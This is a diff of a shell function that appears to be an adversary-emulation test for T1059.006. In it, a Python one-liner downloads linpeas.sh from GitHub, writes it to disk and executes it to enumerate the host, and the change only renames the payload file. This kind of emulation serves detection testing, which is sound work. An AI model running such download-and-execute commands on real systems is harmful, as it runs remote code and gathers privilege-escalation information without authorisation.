@@ -7,7 +7,7 @@ function a() {
     echo $id
     # Atomic Test 1 - Execute shell script via python's command mode arguement
     which_python=$(which python || which python3 || which python2)
-    $which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload-1 -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload-1", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+    $which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
     echo  $(date -u) "Completed T1059.006 - Execute shell script via python's command mode arguement" >> /tmp/attacktest.txt
     sleep 60
 }
